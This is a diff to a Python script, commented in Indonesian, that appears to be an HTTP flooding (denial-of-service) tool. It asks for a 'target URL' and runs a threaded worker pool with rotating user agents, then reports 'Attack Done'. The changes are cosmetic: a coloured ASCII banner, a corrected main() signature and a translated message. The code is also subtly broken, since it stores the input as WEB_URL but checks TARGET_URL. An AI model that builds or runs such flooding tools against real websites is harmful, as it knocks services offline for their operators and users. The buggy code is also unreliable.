@@ -52,11 +52,15 @@ def worker_pool(url, num_threads, num_requests, user_agents):
             future.result()
 
 # Fungsi utama
-def main(""):
+def main():
     global TARGET_URL, NUM_THREADS, RATE_LIMIT
-    print("╔╦╗╔═╗╔╦╗╔═╗╦ ╦
-           ║║║║╣ ║║║║╣ ╚╦╝
-           ╩ ╩╚═╝╩ ╩╚═╝ ╩")
+    print("""
+    \033[91m
+    ╔╔  ╔═╝ ╔╔  ╔═╝ ║ ║
+    ║║║ ╔═╝ ║║║ ╔═╝ ═╔╝
+    ╝╝╝ ══╝ ╝╝╝ ══╝  ╝ 
+    \033[0m
+    """)
     WEB_URL = input("target URL: ")
     if not TARGET_URL:
         print("Masukkan URL dengan benar")
@@ -83,7 +87,7 @@ def main(""):
     start_time = datetime.now()
     worker_pool(TARGET_URL, NUM_THREADS, 100, user_agents)
     end_time = datetime.now()
-    print(f"Attack Done in {end_time - start_time}")
+    print(f"Attack selesai dalam {end_time - start_time}")
 
 if __name__ == "__main__":
     main()
